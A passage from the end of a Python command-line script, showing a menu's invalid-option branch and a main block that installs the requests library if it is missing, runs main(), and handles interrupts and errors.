            print(f"{RED}[!] Invalid option{RESET}")
            time.sleep(1)

# ===================== RUN =====================

if __name__ == "__main__":
    try:
        # Check if requests module is installed
        try:
            import requests
        except:
            print(f"{YELLOW}[*] Installing requests module...{RESET}")
            os.system("pip install requests")
            import requests
        
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Exiting...{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        sys.exit(1)
